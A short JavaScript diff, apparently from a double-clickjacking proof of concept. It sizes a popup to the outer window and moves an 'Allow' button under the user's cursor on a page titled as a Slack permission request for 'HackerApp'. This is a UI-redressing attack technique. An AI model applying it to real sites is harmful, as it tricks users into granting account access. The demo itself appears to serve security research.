@@ -5,7 +5,7 @@
     window.open(
       './dcj.html' + (isReal ? '?real=1' : ''),
       '_blank',
-      `popup=yes,width=${window.innerWidth},height=${window.innerHeight},left=${window.screenX},top=${window.screenY}`,
+      `popup=yes,width=${window.outerWidth},height=${window.outerHeight},left=${window.screenX},top=${window.screenY}`,
     )
   }
 
@@ -17,9 +17,15 @@
   }
 
   window.DCJVictim = {
-    revealOAuth() {
+    revealOAuth(cx, cy) {
       document.documentElement.classList.add('oauth-ready')
       document.title = 'HackerApp is requesting permission | Slack'
+      if (cx != null) {
+        const btn = document.getElementById('allow-btn')
+        btn.style.top = `${cy}px`
+        btn.style.left = `${cx}px`
+        btn.style.transform = 'translate(-50%, -50%)'
+      }
       wireAllowButton()
     },
   }
